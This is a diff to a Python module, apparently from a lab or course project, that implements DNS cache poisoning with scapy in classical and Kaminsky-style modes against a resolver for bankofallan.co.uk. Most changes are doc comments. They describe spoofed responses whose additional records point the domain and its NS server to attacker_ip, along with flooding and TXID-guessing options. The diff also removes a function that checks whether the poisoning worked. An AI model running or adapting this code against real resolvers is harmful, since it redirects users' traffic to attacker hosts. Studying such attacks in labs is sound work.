@@ -2,7 +2,6 @@
 
 ## @package DNS_Poisoning
 #
-#   This package includes all methos to execute the poisoning attack.
 
 
 from scapy import *
@@ -16,13 +15,24 @@ from enum import Enum
 
 ##  @class DNSPoisoning
 #
-#   This class is responsible for the dns poisoning attack. Two mode are available:
-#   - Normal Flood (Use IP packets)
-#   - Faster Flood (Use Ethernet packets)
+#   This package includes all methos to execute the poisoning attack.
+#   <b>DNSPoisoning.faster_flooding</b> sends packet at layer two (for this reason it requires both victim MAC and network interface specified)
+#       , making the attack faster and more prone to succed. However this feature can be used
+#       only when the victim server is on the same network of the attacker.\n
+#   <b>DNSPoisoning.start_flooding</b> instead uses the IP layer and therefore can be applied in any situation.\n
 #   
-#   In addition two type of attack can be performed:
-#   - Classical Poisoning
-#   - Dan's Poisoning
+#   Two types of attack are implemented:
+#   - Classical Attack
+#   - Dan's Attack
+#
+#   The first one only tries to spoof a single domain (the one setted in the "spoofed_domain")
+#       while the other one tries to spoof the NS server.
+#
+#   Note: The class by default prints output formatted for the blessing library.
+#   That's why inside messages some strings like "{t.bold}" may appear.
+#   If you want to use coloured output, write a log function that format messages with a blessing instance.
+#   Otherwise write a regex to suppress those strings from output.
+#   Take look at the function present in the main.py for example.
 #
 class DNSPoisoning:
 
@@ -54,7 +64,7 @@ class DNSPoisoning:
     #   @param nic_interface    The Network Card Interface to use (Reccomended on "faster flood" mode)
     #
     #
-    #    @param interrupt_handler    The function that handle the CTRL+C signal    
+    #   @param interrupt_handler    The function that handle the CTRL+C signal    
     #   @param log              The function used to print messages
     #
     #
@@ -118,8 +128,10 @@ class DNSPoisoning:
 
     ##
     #   @brief Set Victim MAC address
+    #   @param victim_mac   The MAC address to set
     #   Set Victim MAC address. This option is only required in "faster flooding" mode.
-    #
+    #   
+    #   @exceptions Raise DNSPoisoning::InvalidMAC when an invalid MAC is supplied
     def set_victim_mac(self, victim_mac):
         if victim_mac is None:
             raise self.InvalidMAC
@@ -127,7 +139,7 @@ class DNSPoisoning:
 
     ##
     #   Set the random URL to be used during the attack
-    #
+    #   @param url  The URL to set
     def set_random_url(self, url):
         self.random_url = url
 
@@ -184,6 +196,15 @@ class DNSPoisoning:
     #   When using "faster flood" mode the victim_mac should be provided in order to craft the Ethernet layer.
     #   Otherwise only layer 3 will be used.
     #
+    #   DNS Crafted response:  
+    #   - ID
+    #   - Authoritative
+    #   - Question
+    #       * Invalid Domain
+    #   - Source Port 
+    #   - Additional RR
+    #       - random.bankofallan.co.uk -> attacker_ip
+    #       - bankofallan.co.uk -> attacker_ip
     def get_classical_response(self, ID=None, victim_mac=None):
         if ID is None:
             ID = self.id
@@ -217,6 +238,17 @@ class DNSPoisoning:
     #   When using "faster flood" mode the victim_mac should be provided in order to craft the Ethernet layer.
     #   Otherwise only layer 3 will be used.
     #
+    #   DNS Crafted response:  
+    #   - ID
+    #   - Authoritative
+    #   - Question
+    #       * Invalid Domain
+    #   - Source Port 
+    #   - Authoritative Reponse
+    #       * ns.bankofallan.co.uk
+    #   - Additional RR
+    #       - ns.bankofallan.co.uk -> attacker_ip
+    #       - bankofallan.co.uk -> attacker_ip
     def get_dan_response(self, ID=None, victim_mac=None):
         if ID is None:
             ID = self.id
@@ -297,11 +329,9 @@ class DNSPoisoning:
 
     ##  Send crafted packet
     #
-    #   @brief This function bla bla bla bla aaaaaa
-    #   @param id_req The TXID to be used
     #
     #   A valid DNS response should respect the following params:
-    #   - Response should come from the same dest port (53)
+    #   - Response should use the same destination port that the victim server used
     #   - Question should match the query section
     #   - Query ID should match
     #
@@ -379,8 +409,9 @@ class DNSPoisoning:
     #
     #   @brief Start normal flooding attack
     #
-    #   @param number_of_guess  Number of response to send (Default 500)
-    #   @param spacing          The value to be added to the initial TXID
+    #   @param number_of_guess  Number of response to send (Default 10)
+    #   @param spacing          The value to be added to the initial TXID (Default 2)
+    #   @param socket           The socket to be used, if none is passed then a new socket is opened
     #
     #   Start the normal flooding attack which uses IP layer packets
     #   @todo: Check that maximum int value do not surpass 65535 (max 16 bit value)
@@ -424,40 +455,6 @@ class DNSPoisoning:
         send(pkts, socket=socket)
 
         self.log("Flood finished", 2)
-
-
-    ## Check Poisoning
-    #   @brief Check if the attack succeded
-    # 
-    #   Ask the victim for the IP of the domain we are trying to spoof
-    #   @todo Finish implement this
-    #   @bug Does not work
-    def check_poisoning(self):
-        pkt = None
-        if self.victim_mac is not None:
-            pkt = Ether(dst=self.victim_mac)
-        pkt = IP(dst=self.victim_server) / UDP(sport=53, dport=53) / DNS(qr=0, qd=DNSQR(qname=self.spoofed_domain, qtype='A'))
-
-        try:
-            if self.victim_mac is not None:
-                print("Using layer 2")
-                pkt = srp1(pkt, iface=self.nic_interface)
-            else:
-                pkt = sr1(pkt)
-            self.log("Answer arrived")
-            if pkt == None:
-                self.log("Packet is empty")
-                return False
-            print(pkt)
-            if pkt[DNS].an and pkt[DNS].an.rdata:
-                actualAnswer = str(pkt[DNS].an.rdata)
-                # if the IP is our IP, we poisoned the victim
-                if actualAnswer == self.attacker_ip:
-                    return True
-            return False
-        except Exception as e:
-            print("ERROR - " + str(e))
-            return False
 
 
     ##  Stop Handler
